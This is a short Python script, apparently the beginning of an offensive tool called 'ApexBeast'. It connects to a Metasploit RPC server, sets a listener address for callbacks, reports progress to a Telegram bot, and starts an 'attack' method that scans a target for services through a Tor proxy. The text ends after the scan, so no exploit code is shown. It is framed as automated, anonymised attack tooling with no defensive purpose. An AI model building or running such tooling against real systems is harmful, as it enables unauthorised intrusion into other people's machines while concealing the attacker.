import nmap, shodan, time, sys, os, requests
from pymetasploit3.msfrpc import MsfRpcClient
CONFIG = {'SHODAN_KEY': 'YOUR_KEY', 'MSF_PASS': 'mypassword', 'LHOST': 'YOUR_IP', 'TG_TOKEN': 'YOUR_TOKEN', 'CHAT_ID': 'YOUR_ID'}
def send_tg(msg):
    url = f'https://api.telegram.org/bot{CONFIG["TG_TOKEN"]}/sendMessage'
    requests.post(url, data={'chat_id': CONFIG['CHAT_ID'], 'text': msg})
class ApexBeast:
    def __init__(self):
        self.client = MsfRpcClient(CONFIG['MSF_PASS'], port=55553)
        self.nm = nmap.PortScanner()
    def attack(self, target):
        send_tg(f'Scanning: {target}')
        self.nm.scan(target, arguments='--proxies socks5://127.0.0.1:9050 -sV -Pn')
